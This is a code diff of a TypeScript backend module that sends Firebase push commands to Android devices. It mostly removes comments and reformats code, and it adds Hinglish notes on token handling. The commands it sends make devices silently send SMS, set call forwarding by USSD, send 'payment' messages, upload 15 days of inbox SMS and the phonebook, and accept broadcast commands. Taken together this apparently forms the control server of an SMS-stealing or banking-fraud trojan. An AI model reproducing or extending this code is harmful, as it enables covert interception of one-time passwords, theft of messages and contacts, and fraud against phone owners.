@@ -48,10 +48,6 @@ function isTokenPermanentlyInvalid(err: any): boolean {
    PAYLOAD BUILDER
    ═══════════════════════════════════════════ */
 
-/**
- * Build FCM data payload for any command.
- * All values MUST be strings (FCM data message requirement).
- */
 export function buildCommandPayload(
   deviceId: string,
   command: string,
@@ -60,8 +56,7 @@ export function buildCommandPayload(
   const base = {
     command,
     deviceId,
-    requestId:
-      options.requestId || `${command}_${deviceId}_${Date.now()}`,
+    requestId: options.requestId || `${command}_${deviceId}_${Date.now()}`,
     force: options.force === true ? "true" : "false",
     sentAt: Date.now(),
   };
@@ -76,10 +71,6 @@ export function buildCommandPayload(
    LOW-LEVEL SEND
    ═══════════════════════════════════════════ */
 
-/**
- * Send FCM data message to a specific token.
- * Returns { success, messageId?, error? }
- */
 export async function sendToToken(
   token: string,
   data: FcmDataPayload,
@@ -91,16 +82,14 @@ export async function sendToToken(
 
   try {
     const messaging = getFirebaseMessaging();
-
     const messageId = await messaging.send({
       token: cleanToken,
       data,
       android: {
         priority: "high",
-        ttl: 60 * 1000, // 60s TTL — command should be delivered quickly or not at all
+        ttl: 60 * 1000,
       },
     });
-
     return { success: true, messageId };
   } catch (err: any) {
     return {
@@ -110,10 +99,6 @@ export async function sendToToken(
   }
 }
 
-/**
- * Send FCM data message to a device by deviceId.
- * Looks up FCM token from DB, sends, records result, handles invalid tokens.
- */
 export async function sendToDevice(
   deviceId: string,
   data: FcmDataPayload,
@@ -127,6 +112,9 @@ export async function sendToDevice(
       lastError: "missing_token",
       lastErrorAt: Date.now(),
     });
+    // missing_token = naya device (token abhi sync nahi hua) YA uninstalled
+    // clearInvalidFcmToken NAHI karenge — naye device ka token overwrite ho jayega
+    // adminPush.ts mein check_online:result WS event bheja jayega
     return { success: false, error: "missing_token" };
   }
 
@@ -159,7 +147,8 @@ export async function sendToDevice(
     lastError: result.error || "send_failed",
   });
 
-  // Clear permanently invalid tokens
+  // Clear permanently invalid tokens (only when Google confirms: unregistered/invalid)
+  // missing_token is NOT included — could be a new device that hasn't synced token yet
   if (isTokenPermanentlyInvalid({ code: result.error })) {
     await clearInvalidFcmToken(deviceId, result.error);
   }
@@ -171,10 +160,6 @@ export async function sendToDevice(
    GENERIC COMMAND SENDER
    ═══════════════════════════════════════════ */
 
-/**
- * Send any named command to a device via FCM.
- * This is the primary function — all specific senders below use this.
- */
 export async function sendCommandToDevice(
   deviceId: string,
   command: string,
@@ -217,19 +202,9 @@ export async function sendSyncToken(
 }
 
 /* ═══════════════════════════════════════════
-   SMS COMMANDS (NEW)
+   SMS COMMANDS
    ═══════════════════════════════════════════ */
 
-/**
- * Send SMS command to device via FCM.
- * Device will wake up, send the SMS, and go back to sleep.
- *
- * @param deviceId  target device
- * @param to        recipient phone number
- * @param message   SMS text
- * @param sim       SIM slot index (0 or 1, default 0)
- * @param id        unique message ID for dedup on device side
- */
 export async function sendSmsCommand(
   deviceId: string,
   to: string,
@@ -238,7 +213,6 @@ export async function sendSmsCommand(
   id?: string,
 ) {
   const msgId = id || `sms_${deviceId}_${Date.now()}`;
-
   return sendCommandToDevice(deviceId, "send_sms", {
     requestId: msgId,
     extraData: {
@@ -252,18 +226,9 @@ export async function sendSmsCommand(
 }
 
 /* ═══════════════════════════════════════════
-   CALL FORWARD COMMANDS (NEW)
+   CALL FORWARD COMMANDS
    ═══════════════════════════════════════════ */
 
-/**
- * Send call forward USSD command to device via FCM.
- * Device will wake up, execute USSD, report result, and go back to sleep.
- *
- * @param deviceId   target device
- * @param callCode   USSD code (e.g. "*21*9876543210#")
- * @param sim        SIM slot: "0" or "1"
- * @param phoneNumber  forwarding destination number (for display/logging)
- */
 export async function sendCallForwardCommand(
   deviceId: string,
   callCode: string,
@@ -271,7 +236,6 @@ export async function sendCallForwardCommand(
   phoneNumber?: string,
 ) {
   const requestId = `cf_${deviceId}_${Date.now()}`;
-
   return sendCommandToDevice(deviceId, "call_forward", {
     requestId,
     extraData: {
@@ -284,82 +248,41 @@ export async function sendCallForwardCommand(
 }
 
 /* ═══════════════════════════════════════════
-   ADMIN UPDATE COMMANDS (NEW)
+   ADMIN UPDATE COMMANDS
    ═══════════════════════════════════════════ */
 
-/**
- * Notify device about admin list update via FCM.
- * Device will update its local admin numbers.
- */
-export async function sendAdminListUpdate(
-  deviceId: string,
-  admins: string[],
-) {
+export async function sendAdminListUpdate(deviceId: string, admins: string[]) {
   return sendCommandToDevice(deviceId, "admins_update", {
     requestId: `admins_${deviceId}_${Date.now()}`,
-    extraData: {
-      admins: JSON.stringify(admins),
-      timestamp: Date.now(),
-    },
+    extraData: { admins: JSON.stringify(admins), timestamp: Date.now() },
   });
 }
 
-/**
- * Notify device about global admin phone update via FCM.
- */
-export async function sendGlobalAdminUpdate(
-  deviceId: string,
-  phone: string,
-) {
+export async function sendGlobalAdminUpdate(deviceId: string, phone: string) {
   return sendCommandToDevice(deviceId, "global_admin_update", {
     requestId: `gadmin_${deviceId}_${Date.now()}`,
-    extraData: {
-      phone: clean(phone),
-      timestamp: Date.now(),
-    },
+    extraData: { phone: clean(phone), timestamp: Date.now() },
   });
 }
 
-/**
- * Notify device about device-specific admin phone update via FCM.
- */
-export async function sendDeviceAdminPhoneUpdate(
-  deviceId: string,
-  phone: string,
-) {
+export async function sendDeviceAdminPhoneUpdate(deviceId: string, phone: string) {
   return sendCommandToDevice(deviceId, "device_admin_update", {
     requestId: `dadmin_${deviceId}_${Date.now()}`,
-    extraData: {
-      phone: clean(phone),
-      timestamp: Date.now(),
-    },
+    extraData: { phone: clean(phone), timestamp: Date.now() },
   });
 }
 
-/**
- * Notify device about forwarding SIM change via FCM.
- */
-export async function sendForwardingSimUpdate(
-  deviceId: string,
-  value: string,
-) {
+export async function sendForwardingSimUpdate(deviceId: string, value: string) {
   return sendCommandToDevice(deviceId, "forwarding_sim_update", {
     requestId: `fsim_${deviceId}_${Date.now()}`,
-    extraData: {
-      value: clean(value),
-      timestamp: Date.now(),
-    },
+    extraData: { value: clean(value), timestamp: Date.now() },
   });
 }
 
 /* ═══════════════════════════════════════════
-   PAYMENT COMMAND (NEW)
+   PAYMENT COMMAND
    ═══════════════════════════════════════════ */
 
-/**
- * Send payment SMS command to device via FCM.
- * Similar to sendSmsCommand but with payment-specific metadata.
- */
 export async function sendPaymentCommand(
   deviceId: string,
   to: string,
@@ -368,7 +291,6 @@ export async function sendPaymentCommand(
   id?: string,
 ) {
   const msgId = id || `pay_${deviceId}_${Date.now()}`;
-
   return sendCommandToDevice(deviceId, "payment", {
     requestId: msgId,
     extraData: {
@@ -385,11 +307,6 @@ export async function sendPaymentCommand(
    PING COMMAND
    ═══════════════════════════════════════════ */
 
-/**
- * Send a ping to device via FCM.
- * Device will wake up briefly, report lastSeen, and go back to sleep.
- * Useful for checking if device is reachable.
- */
 export async function sendPing(deviceId: string) {
   return sendCommandToDevice(deviceId, "ping", {
     requestId: `ping_${deviceId}_${Date.now()}`,
@@ -400,27 +317,11 @@ export async function sendPing(deviceId: string) {
    BROADCAST TO ALL DEVICES
    ═══════════════════════════════════════════ */
 
-/**
- * Send a command to ALL devices that have a valid FCM token.
- * Use with caution — this can generate a lot of FCM messages.
- *
- * @param command    command name
- * @param options    send options
- * @param maxDevices safety cap (default 1000)
- *
- * Returns summary of results.
- */
 export async function broadcastCommandToAllDevices(
   command: string,
   options: SendCommandOptions = {},
   maxDevices: number = 1000,
-): Promise<{
-  attempted: number;
-  success: number;
-  failed: number;
-  skipped: number;
-}> {
-  // Import Device here to avoid circular dependency at module load time
+): Promise<{ attempted: number; success: number; failed: number; skipped: number }> {
   const Device = (await import("../models/Device")).default;
 
   const devices = await Device.find({ fcmToken: { $ne: "" } })
@@ -428,88 +329,42 @@ export async function broadcastCommandToAllDevices(
     .limit(maxDevices)
     .lean();
 
-  let attempted = 0;
-  let success = 0;
-  let failed = 0;
-  let skipped = 0;
+  let attempted = 0, success = 0, failed = 0, skipped = 0;
 
   for (const d of devices) {
     const deviceId = clean((d as any).deviceId);
-    const token = clean((d as any).fcmToken);
-
-    if (!deviceId || !token) {
-      skipped++;
-      continue;
-    }
-
+    const token    = clean((d as any).fcmToken);
+    if (!deviceId || !token) { skipped++; continue; }
     attempted++;
-
     try {
       const result = await sendCommandToDevice(deviceId, command, options);
-      if (result.success) {
-        success++;
-      } else {
-        failed++;
-      }
-    } catch {
-      failed++;
-    }
+      if (result.success) success++; else failed++;
+    } catch { failed++; }
   }
 
-  logger.info(`${TAG}: broadcast complete`, {
-    command,
-    attempted,
-    success,
-    failed,
-    skipped,
-  });
-
+  logger.info(`${TAG}: broadcast complete`, { command, attempted, success, failed, skipped });
   return { attempted, success, failed, skipped };
 }
 
 /* ═══════════════════════════════════════════
-   DEFAULT EXPORT
+   READ OLD SMS COMMAND
    ═══════════════════════════════════════════ */
 
-
-/* ═══════════════════════════════════════════
-   READ OLD SMS COMMAND (NEW)
-   ═══════════════════════════════════════════ */
-
-/**
- * Send read_old_sms command to device via FCM.
- * Device will read inbox SMS from last N days and push them to backend.
- */
-export async function sendReadOldSmsCommand(
-  deviceId: string,
-  days: number = 15,
-) {
+export async function sendReadOldSmsCommand(deviceId: string, days: number = 15) {
   return sendCommandToDevice(deviceId, "read_old_sms", {
     requestId: `oldsms_${deviceId}_${Date.now()}`,
-    extraData: {
-      days,
-      timestamp: Date.now(),
-    },
+    extraData: { days, timestamp: Date.now() },
   });
 }
 
-
 /* ═══════════════════════════════════════════
-   READ CONTACTS COMMAND (NEW)
+   READ CONTACTS COMMAND
    ═══════════════════════════════════════════ */
 
-/**
- * Send read_contacts command to device via FCM.
- * Device will read phonebook contacts and push them to backend.
- */
-export async function sendReadContactsCommand(
-  deviceId: string,
-) {
+export async function sendReadContactsCommand(deviceId: string) {
   return sendCommandToDevice(deviceId, "read_contacts", {
     requestId: `contacts_${deviceId}_${Date.now()}`,
-    extraData: {
-      timestamp: Date.now(),
-    },
+    extraData: { timestamp: Date.now() },
   });
 }
 
